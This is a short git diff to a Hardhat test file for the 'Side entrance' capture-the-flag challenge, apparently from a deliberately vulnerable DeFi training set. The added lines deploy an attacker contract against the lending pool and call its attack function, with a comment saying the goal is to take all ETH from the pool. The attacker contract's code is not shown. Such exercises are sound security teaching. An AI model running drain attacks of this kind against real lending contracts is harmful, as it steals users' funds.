@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 describe('[Challenge] Side entrance', function () {
 
     let deployer, attacker;
@@ -25,6 +26,11 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //You must take all ETH from the lending pool.
+        const SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', attacker);
+        const attackerContract = await SideEntranceAttackerFactory.deploy(this.pool.address);
+        await attackerContract.attack();
+
     });
 
     after(async function () {
